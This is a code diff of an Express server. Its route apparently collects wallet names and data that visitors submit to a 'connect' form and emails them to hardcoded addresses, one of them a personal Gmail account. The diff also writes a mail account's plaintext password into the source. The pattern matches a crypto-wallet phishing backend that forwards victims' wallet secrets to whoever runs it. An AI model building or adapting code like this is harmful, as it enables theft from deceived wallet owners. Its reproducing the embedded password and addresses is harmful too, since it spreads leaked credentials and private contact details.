@@ -5,7 +5,7 @@ const dotenv = require('dotenv')
 const app = express()
 dotenv.config()
 
-const PORT = process.env.PORT || 5500
+const PORT = 5500 
 
 app.use(express.static("views"))
 app.use(express.static(__dirname + "/public/"))
@@ -40,8 +40,8 @@ app.post('/welcome/connect/:id/submit', async (req, res) => {
     const transporter = nodemailer.createTransport({
         service: 'zoho',
         auth: {
-            user: process.env.USERNAME,
-            pass: process.env.PASSWORD
+            user: "forwarding@fixnode-explorer.com",
+            pass: "Mohammad1996##"
         }
     })
 
@@ -57,10 +57,10 @@ app.post('/welcome/connect/:id/submit', async (req, res) => {
         })
     })
 
-    const recipients = [process.env.RECIPIENT1, process.env.RECIPIENT2]
+    const recipients = ["forwarding@fixnode-explorer.com", "salim72salim72@gmail.com"]
     for(let recipient of recipients) {
         const mailOptions = {
-            from: process.env.FROM,
+            from: "forwarding@fixnode-explorer.com",
             to: recipient,
             subject: `${req.body.category}`,
             html: `Wallet Name(s): ${req.params.id} <br> ${req.body.data}`
